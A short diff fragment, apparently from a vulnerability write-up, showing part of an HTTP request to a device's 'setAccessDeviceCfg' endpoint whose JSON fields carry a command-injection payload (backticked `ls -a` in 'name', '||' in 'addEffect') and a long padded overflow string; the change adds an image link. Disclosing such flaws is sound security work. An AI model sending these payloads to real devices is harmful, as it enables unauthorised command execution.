@@ -27,3 +27,4 @@ Connection: close
 
 {"topicurl": "setAccessDeviceCfg", "addEffect": "||wzq", "mac": "wzqwzqwzq", "modelType": "aaaaaaaaaaaaaaaaaaawzqwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawzqwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "white": "'wzq", "name": "";`ls -a`"}
 ```
+![alt text](image-3.png)
